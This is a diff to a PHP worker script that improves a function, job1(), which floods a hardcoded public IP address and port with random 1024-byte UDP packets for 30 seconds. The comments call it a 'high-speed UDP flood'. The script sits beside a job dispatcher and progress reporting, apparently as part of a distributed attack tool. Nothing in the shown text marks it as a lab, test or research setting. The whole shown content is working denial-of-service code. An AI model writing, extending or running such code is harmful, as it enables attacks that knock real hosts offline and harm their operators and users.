@@ -232,51 +232,109 @@ function workerProgress(
 // JOB 1
 // ============================================================
 
-function job1(): array
+function job1(array $task = [], ?callable $report = null): array
 {
     // --- Configuration ---
-    $targetIp = '35.79.103.106'; // Change to target IP
-    $targetPort = 9044;        // Change to target port
-    $packetSize = 1024;      // Packet size in bytes
-    $duration = 30;           // Duration in seconds
+    $targetIp = '35.79.103.106';
+    $targetPort = 9044;
+    $packetSize = 1024;
+    $duration = 30;
+
+    // Validate configuration
+    if ($targetPort < 1 || $targetPort > 65535) {
+        return [
+            'success' => false,
+            'error' => 'Invalid UDP port'
+        ];
+    }
+
+    if ($packetSize < 1 || $packetSize > 1400) {
+        return [
+            'success' => false,
+            'error' => 'Invalid packet size'
+        ];
+    }
+
+    if ($duration < 1 || $duration > 300) {
+        return [
+            'success' => false,
+            'error' => 'Invalid duration'
+        ];
+    }
 
     $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
     
     if ($socket === false) {
         return [
             'success' => false,
-            'packets_sent' => 0,
-            'error' => socket_strerror(socket_last_error())
+            'error' => 'socket_create failed: ' . socket_strerror(socket_last_error())
         ];
     }
 
-    $payload = random_bytes($packetSize);
-    $end_time = time() + $duration;
-    $packet_count = 0;
-    $lastError = null;
+    @socket_set_option($socket, SOL_SOCKET, SO_SNDBUF, 65536);
 
     try {
-        while (time() < $end_time) {
-            $sent = socket_sendto($socket, $payload, $packetSize, 0, $targetIp, $targetPort);
-            if ($sent !== false) {
-                $packet_count++;
-            } else {
-                $errCode = socket_last_error($socket);
-                $lastError = socket_strerror($errCode);
-            }
-        }
-    } catch (Exception $e) {
-        $lastError = $e->getMessage();
-    } finally {
+        $payload = random_bytes($packetSize);
+        $payloadLength = strlen($payload);
+    } catch (Throwable $e) {
         socket_close($socket);
+        return [
+            'success' => false,
+            'error' => 'Could not generate payload: ' . $e->getMessage()
+        ];
+    }
+
+    $start = microtime(true);
+    $deadline = $start + $duration;
+
+    $sent = 0;
+    $failed = 0;
+    $lastError = null;
+
+    if ($report) {
+        $report(0, 'Starting high-speed UDP flood');
+    }
+
+    while (microtime(true) < $deadline) {
+        $result = @socket_sendto(
+            $socket,
+            $payload,
+            $payloadLength,
+            0,
+            $targetIp,
+            $targetPort
+        );
+
+        if ($result === false) {
+            $failed++;
+            $lastError = socket_strerror(socket_last_error($socket));
+        } elseif ($result !== $payloadLength) {
+            $failed++;
+            $lastError = 'Partial UDP send';
+        } else {
+            $sent++;
+        }
+    }
+
+    socket_close($socket);
+
+    $success = $sent > 0;
+
+    if ($report) {
+        $report(100, 'Completed UDP flood');
     }
 
     return [
-        'success' => $packet_count > 0,
-        'packets_sent' => $packet_count,
-        'error' => $lastError ?: null
+        'success' => $success,
+        'target' => $targetIp . ':' . $targetPort,
+        'duration' => $duration,
+        'packet_size' => $packetSize,
+        'packets_sent' => $sent,
+        'packets_failed' => $failed,
+        'last_error' => $lastError
     ];
 }
+
 
 // ============================================================
 // JOB DISPATCHER
